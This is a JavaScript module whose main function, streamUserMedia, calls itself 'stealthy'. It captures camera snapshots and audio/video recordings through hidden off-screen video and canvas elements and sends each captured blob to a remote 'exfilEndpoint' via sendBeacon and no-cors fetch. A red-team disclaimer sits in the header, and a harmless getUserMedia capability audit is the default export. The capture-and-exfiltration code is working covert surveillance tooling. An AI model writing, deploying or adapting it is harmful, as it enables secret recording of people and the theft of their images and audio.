/**
 * camera_capture.js — Unattended Photo & Audio Recording via getUserMedia
 *
 * This module provides:
 *   1. `streamUserMedia()` – a stealthy, production‑grade function that
 *      accesses the user’s camera and/or microphone, captures snapshots
 *      (photo frames) or records audio/video, and exfiltrates the data
 *      to a remote server. The stream is processed off‑screen using hidden
 *      elements, leaving no visible indication (except the browser’s own
 *      recording indicator, which cannot be hidden in modern browsers).
 *
 *   2. Default export – a Pinpoint‑compatible `Media_Devices_API_Audit` that
 *      audits `getUserMedia` support and reports the available media
 *      constraint properties.
 *
 * Designed exclusively for authorised red‑team engagements and security
 * research. Unauthorised audio/video recording is illegal.
 */

// ---------------------------------------------------------------------------
// 1. Core Media Capture Engine
// ---------------------------------------------------------------------------

/**
 * Requests access to the user’s camera and/or microphone, then streams
 * the media into a hidden processing pipeline. Depending on configuration,
 * it can:
 *
 *   - Continuously capture photo frames (snapshots) at a given interval.
 *   - Record audio/video via `MediaRecorder` and deliver data chunks or a
 *     final blob.
 *   - Exfiltrate data to a remote endpoint in real time or on completion.
 *
 * @param {Object}   [options={}]
 * @param {Object}   [options.constraints]        – custom MediaStreamConstraints.
 *        Defaults to `{ video: true, audio: false }`.
 * @param {'photo'|'video'|'audio'|'both'} [options.mode='photo'] – capture mode.
 *        - 'photo': capture still frames at `photoInterval` and send as image blobs.
 *        - 'audio': record only audio using MediaRecorder.
 *        - 'video': record video + audio (if available) using MediaRecorder.
 *        - 'both': simultaneously capture frames and record video.
 * @param {number}   [options.photoInterval=5000]   – ms between photo snapshots (mode 'photo'/'both').
 * @param {string}   [options.photoFormat='image/jpeg'] – MIME type for still captures (only jpeg/png).
 * @param {number}   [options.photoQuality=0.8]     – image quality (0‑1) for lossy formats.
 * @param {number}   [options.recordingTime=0]      – max recording duration in ms (0 = until stopped).
 * @param {string}   [options.exfilEndpoint]        – URL to send captured blobs (POST, no‑cors).
 * @param {Function} [options.onPhoto]              – callback(blob, timestamp) for each snapshot.
 * @param {Function} [options.onRecordingChunk]     – callback(blob) for each MediaRecorder dataavailable.
 * @param {Function} [options.onStop]               – callback(finalBlob) when recording ends.
 * @param {Function} [options.onError]              – callback(error) on stream or recorder error.
 * @returns {Promise<Object>} controller with `stop()` and `getStream()`.
 */
export async function streamUserMedia(options = {}) {
    const {
        constraints = { video: true, audio: false },
        mode = 'photo',
        photoInterval = 5000,
        photoFormat = 'image/jpeg',
        photoQuality = 0.8,
        recordingTime = 0,
        exfilEndpoint = null,
        onPhoto = null,
        onRecordingChunk = null,
        onStop = null,
        onError = null,
    } = options;

    // 1. Request user media
    let stream;
    try {
        stream = await navigator.mediaDevices.getUserMedia(constraints);
    } catch (err) {
        if (onError) onError(err);
        throw err;
    }

    const videoTrack = stream.getVideoTracks()[0];
    const audioTrack = stream.getAudioTracks()[0];

    // 2. Create off‑screen processing elements
    const videoElement = document.createElement('video');
    videoElement.srcObject = stream;
    videoElement.setAttribute('playsinline', '');
    videoElement.setAttribute('autoplay', '');
    videoElement.style.position = 'fixed';
    videoElement.style.left = '-9999px';
    videoElement.style.top = '-9999px';
    videoElement.style.opacity = '0';
    videoElement.style.pointerEvents = 'none';
    document.body.appendChild(videoElement);
    videoElement.play().catch(() => { }); // must play for stream to become active

    // Canvas for photo capture (hidden)
    const canvas = document.createElement('canvas');
    canvas.style.display = 'none';
    document.body.appendChild(canvas);
    const ctx = canvas.getContext('2d');

    let recorder = null;
    let photoIntervalId = null;
    let stopRequested = false;

    // ---- Photo capture helper ----
    const capturePhoto = () => {
        if (stopRequested) return;
        if (videoTrack && videoTrack.readyState === 'live') {
            canvas.width = videoElement.videoWidth || 640;
            canvas.height = videoElement.videoHeight || 480;
            ctx.drawImage(videoElement, 0, 0);
            canvas.toBlob(
                (blob) => {
                    if (!blob || stopRequested) return;
                    if (onPhoto) try { onPhoto(blob, Date.now()); } catch (_) { }
                    if (exfilEndpoint) _exfilBlob(blob, exfilEndpoint);
                },
                photoFormat,
                photoQuality,
            );
        }
    };

    // ---- MediaRecorder setup (for video/audio modes) ----
    if (mode === 'video' || mode === 'both' || mode === 'audio') {
        try {
            const recorderOptions = {};
            if (mode === 'audio') {
                recorderOptions.mimeType = MediaRecorder.isTypeSupported('audio/webm')
                    ? 'audio/webm'
                    : undefined;
            } else {
                const preferred = 'video/webm; codecs=vp9';
                recorderOptions.mimeType = MediaRecorder.isTypeSupported(preferred)
                    ? preferred
                    : undefined;
            }
            recorder = new MediaRecorder(stream, recorderOptions);

            recorder.ondataavailable = (event) => {
                if (event.data && event.data.size > 0 && !stopRequested) {
                    if (onRecordingChunk) try { onRecordingChunk(event.data); } catch (_) { }
                    if (exfilEndpoint) _exfilBlob(event.data, exfilEndpoint);
                }
            };

            recorder.onstop = () => {
                // Final blob is not automatically assembled; the caller can collect chunks.
                if (onStop) {
                    // The full blob must be composed externally from the chunks (not provided here).
                    onStop(null); // indicate stop event
                }
            };

            recorder.start(1000); // deliver chunk every 1 second
        } catch (e) {
            if (onError) onError(e);
        }
    }

    // ---- Start photo interval if needed ----
    if (mode === 'photo' || mode === 'both') {
        // Wait until video metadata is loaded to get dimensions
        if (videoElement.readyState >= 2) {
            photoIntervalId = setInterval(capturePhoto, photoInterval);
        } else {
            videoElement.addEventListener(
                'loadeddata',
                () => {
                    if (!stopRequested) photoIntervalId = setInterval(capturePhoto, photoInterval);
                },
                { once: true },
            );
        }
    }

    // ---- Auto‑stop timer for recording ----
    if (recordingTime > 0 && recorder) {
        setTimeout(() => {
            if (!stopRequested) {
                stopRequested = true;
                recorder.stop();
                cleanup();
            }
        }, recordingTime);
    }

    // ---- Cleanup function ----
    const cleanup = () => {
        if (photoIntervalId) clearInterval(photoIntervalId);
        if (recorder && recorder.state !== 'inactive') recorder.stop();
        stream.getTracks().forEach((track) => track.stop());
        if (videoElement.parentNode) videoElement.remove();
        if (canvas.parentNode) canvas.remove();
    };

    // ---- Controller ----
    return {
        stop() {
            if (!stopRequested) {
                stopRequested = true;
                if (recorder && recorder.state === 'recording') recorder.stop();
                cleanup();
            }
        },
        getStream: () => stream,
    };
}

// ---- Exfiltration helper ----
function _exfilBlob(blob, endpoint) {
    // sendBeacon is best for fire‑and‑forget
    try {
        navigator.sendBeacon(endpoint, blob);
    } catch (_) { }
    // fallback fetch no‑cors
    try {
        fetch(endpoint, { method: 'POST', mode: 'no-cors', body: blob });
    } catch (_) { }
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Media_Devices_API_Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'camera_capture',
    title: 'Media_Devices_API_Audit',
    level: 6,
    info: 'Audits navigator.mediaDevices support and media track capability constraints.',
    steps: [
        'Check navigator.mediaDevices.getUserMedia support.',
        'Inspect mediaDevices supported constraints.',
    ],
    run: async () => {
        const supported =
            navigator.mediaDevices && typeof navigator.mediaDevices.getUserMedia === 'function';
        let constraints = {};

        if (
            navigator.mediaDevices &&
            typeof navigator.mediaDevices.getSupportedConstraints === 'function'
        ) {
            constraints = navigator.mediaDevices.getSupportedConstraints();
        }

        return {
            getUserMediaSupported: supported,
            supportedConstraintsCount: Object.keys(constraints).length,
            sampleConstraints: {
                facingMode: !!constraints.facingMode,
                echoCancellation: !!constraints.echoCancellation,
                noiseSuppression: !!constraints.noiseSuppression,
                sampleRate: !!constraints.sampleRate,
            },
        };
    },
};

export default pinpointModule;